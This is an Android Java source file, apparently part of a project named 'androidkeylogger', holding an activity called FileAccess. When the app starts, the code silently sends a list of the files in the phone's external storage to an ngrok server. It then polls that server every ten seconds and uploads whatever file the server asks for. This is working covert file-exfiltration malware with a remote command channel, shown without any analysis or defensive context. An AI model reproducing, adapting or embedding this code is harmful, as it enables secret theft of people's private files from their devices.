package com.bshu2.androidkeylogger;

import android.app.Activity;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class FileAccess extends Activity {
    private static final String SERVER_URL = "https://locust-handy-seagull.ngrok-free.app/server.php";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        new Thread(this::sendFileList).start();  // Send file list automatically on app launch
        new Thread(this::checkForDownloadRequests).start();  // Periodically check for file requests
    }

    private void sendFileList() {
        try {
            File directory = Environment.getExternalStorageDirectory();
            File[] files = directory.listFiles();
            if (files == null) return;

            JSONArray fileList = new JSONArray();
            for (File file : files) {
                if (file.isFile()) fileList.put(file.getName());
            }

            HttpURLConnection conn = (HttpURLConnection) new URL(SERVER_URL).openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setDoOutput(true);

            String payload = "file_list=" + fileList.toString();
            try (OutputStream os = conn.getOutputStream()) {
                os.write(payload.getBytes("UTF-8"));
                os.flush();
            }

            Log.d("FileAccess", "Sent file list to server.");
        } catch (Exception e) {
            Log.e("FileAccess", "Error sending file list", e);
        }
    }

    private void checkForDownloadRequests() {
        while (true) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(SERVER_URL + "?get_request=1").openConnection();
                conn.setRequestMethod("GET");

                Scanner scanner = new Scanner(conn.getInputStream());
                if (scanner.hasNext()) {
                    JSONObject response = new JSONObject(scanner.nextLine());
                    if (response.has("file_request")) {
                        String requestedFile = response.getString("file_request");
                        uploadFile(requestedFile);
                    }
                }
                scanner.close();

                Thread.sleep(10000);  // Check every 10 seconds
            } catch (Exception e) {
                Log.e("FileAccess", "Error checking download requests", e);
            }
        }
    }

    private void uploadFile(String fileName) {
        try {
            File file = new File(Environment.getExternalStorageDirectory(), fileName);
            if (!file.exists()) {
                Log.e("FileAccess", "File not found: " + fileName);
                return;
            }

            HttpURLConnection conn = (HttpURLConnection) new URL(SERVER_URL).openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=*****");
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(("--*****\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n\r\n").getBytes());
                try (FileInputStream fis = new FileInputStream(file)) {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        os.write(buffer, 0, bytesRead);
                    }
                }
                os.write("\r\n--*****--\r\n".getBytes());
                os.flush();
            }

            Log.d("FileAccess", "Uploaded file: " + fileName);
        } catch (Exception e) {
            Log.e("FileAccess", "Error uploading file", e);
        }
    }
}
